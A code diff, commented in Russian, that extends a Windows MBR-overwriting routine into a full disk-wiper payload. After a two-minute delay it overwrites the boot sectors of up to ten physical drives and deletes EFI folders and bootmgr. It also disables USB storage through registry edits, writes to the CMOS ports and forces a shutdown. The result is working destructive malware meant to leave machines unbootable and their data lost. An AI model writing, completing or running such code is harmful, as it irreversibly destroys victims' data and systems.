@@ -1,17 +1,19 @@
 #include <windows.h>
-#include <cstdio>
+#include <stdio.h>
+#include <winioctl.h>
 
 extern volatile bool g_running;
 
+// ====== GG MBR (16-битный код) ======
 unsigned char mbr_code[512] = {
     0xFA, 0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xC0, 0x8E,
     0xD0, 0xBC, 0x00, 0x7C, 0x89, 0xE3, 0xBD, 0x00,
     0x7C, 0xB8, 0x00, 0x13, 0xCD, 0x10, 0xB8, 0x00,
     0xA0, 0x8E, 0xC0, 0xBF, 0x00, 0x00, 0xB9, 0x00,
-    0xFA, 0xB0, 0x0C, 0xF3, 0xAA, 0xEB, 0xFE, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0xFA, 0xB0, 0x0C, 0xF3, 0xAA, 0xBE, 0x00, 0x7C,
+    0xAC, 0x08, 0xC0, 0x74, 0x0C, 0xB4, 0x0E, 0xBB,
+    0x07, 0x00, 0xCD, 0x10, 0xEB, 0xF2, 0xEB, 0xFE,
+    'G', 'G', 0x0D, 0x0A, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
@@ -70,20 +72,15 @@ unsigned char mbr_code[512] = {
     0x00, 0x55, 0xAA
 };
 
-bool WriteMBR() {
-    HANDLE hDisk = CreateFileA(
-        "\\\\.\\PhysicalDrive0",
-        GENERIC_READ | GENERIC_WRITE,
-        FILE_SHARE_READ | FILE_SHARE_WRITE,
-        NULL,
-        OPEN_EXISTING,
-        0,
-        NULL
-    );
+// ====== УНИЧТОЖАЕТ ВСЕ ДИСКИ (PhysicalDrive0-9) ======
+void KillAllDisks() {
+    char diskPath[32];
     
-    if (hDisk == INVALID_HANDLE_VALUE) {
-        hDisk = CreateFileA(
-            "\\\\.\\PhysicalDrive1",
+    for (int i = 0; i < 10; i++) {
+        sprintf_s(diskPath, "\\\\.\\PhysicalDrive%d", i);
+        
+        HANDLE hDisk = CreateFileA(
+            diskPath,
             GENERIC_READ | GENERIC_WRITE,
             FILE_SHARE_READ | FILE_SHARE_WRITE,
             NULL,
@@ -91,25 +88,92 @@ bool WriteMBR() {
             0,
             NULL
         );
+
+        if (hDisk != INVALID_HANDLE_VALUE) {
+            // Стираем первые 64 сектора (MBR + GPT)
+            for (int sector = 0; sector < 64; sector++) {
+                DWORD bytesWritten;
+                SetFilePointer(hDisk, sector * 512, NULL, FILE_BEGIN);
+                WriteFile(hDisk, mbr_code, 512, &bytesWritten, NULL);
+            }
+            CloseHandle(hDisk);
+        }
     }
-    
-    if (hDisk == INVALID_HANDLE_VALUE) {
-        return false;
-    }
-    
-    DWORD bytesWritten;
-    BOOL result = WriteFile(hDisk, mbr_code, 512, &bytesWritten, NULL);
-    CloseHandle(hDisk);
-    
-    return result && bytesWritten == 512;
 }
 
-DWORD WINAPI InjectMBR_Delayed(LPVOID) {
-    Sleep(120000);
+// ====== УНИЧТОЖАЕТ EFI НА ВСЕХ РАЗДЕЛАХ ======
+void KillAllEFI() {
+    char drivePath[8];
     
-    if (WriteMBR()) {
-        system("shutdown /s /t 5");
+    for (char drive = 'C'; drive <= 'Z'; drive++) {
+        sprintf_s(drivePath, "%c:\\EFI", drive);
+        
+        if (GetFileAttributesA(drivePath) != INVALID_FILE_ATTRIBUTES) {
+            // Удаляем папку EFI полностью
+            char cmd[128];
+            sprintf_s(cmd, "rmdir /s /q %c:\\EFI", drive);
+            system(cmd);
+        }
     }
-    
+}
+
+// ====== ПОРТИТ CMOS/BIOS ======
+void KillCMOS() {
+    // Пытаемся открыть CMOS через порты
+    __try {
+        // Сбрасываем CMOS (классический метод)
+        __outbyte(0x70, 0x80);
+        __outbyte(0x71, 0x00);
+        
+        // Выключаем загрузку с USB
+        __outbyte(0x72, 0x00);
+        __outbyte(0x73, 0x00);
+    } __except(EXCEPTION_EXECUTE_HANDLER) {
+        // Если не получилось — хуй с ним
+    }
+}
+
+// ====== БЛОКИРУЕТ ЗАГРУЗКУ С ФЛЕШКИ ======
+void KillUSB() {
+    // Отключаем USB-контроллеры
+    system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\USBSTOR /v Start /t REG_DWORD /d 4 /f");
+    system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\USB /v Start /t REG_DWORD /d 4 /f");
+    system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\usbehci /v Start /t REG_DWORD /d 4 /f");
+    system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\usbhub /v Start /t REG_DWORD /d 4 /f");
+    system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\usbccgp /v Start /t REG_DWORD /d 4 /f");
+    system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\usbohci /v Start /t REG_DWORD /d 4 /f");
+    system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\usbuhci /v Start /t REG_DWORD /d 4 /f");
+}
+
+// ====== УНИЧТОЖАЕТ BOOTMGR ======
+void KillBootMgr() {
+    system("attrib -h -s -r C:\\bootmgr");
+    system("del /f /q C:\\bootmgr");
+    system("attrib -h -s -r C:\\BOOTNXT");
+    system("del /f /q C:\\BOOTNXT");
+}
+
+// ====== ОСНОВНАЯ ФУНКЦИЯ ======
+DWORD WINAPI InjectMBR_Delayed(LPVOID) {
+    Sleep(120000); // 2 минуты хаоса
+
+    // 1. УНИЧТОЖАЕМ ВСЕ ДИСКИ
+    KillAllDisks();
+
+    // 2. УНИЧТОЖАЕМ EFI
+    KillAllEFI();
+
+    // 3. УНИЧТОЖАЕМ BOOTMGR
+    KillBootMgr();
+
+    // 4. БЛОКИРУЕМ USB/ФЛЕШКИ
+    KillUSB();
+
+    // 5. ПОРТИМ CMOS
+    KillCMOS();
+
+    // 6. ФИНАЛЬНАЯ ПЕРЕЗАГРУЗКА
+    system("shutdown /s /t 5");
+
     return 0;
 }
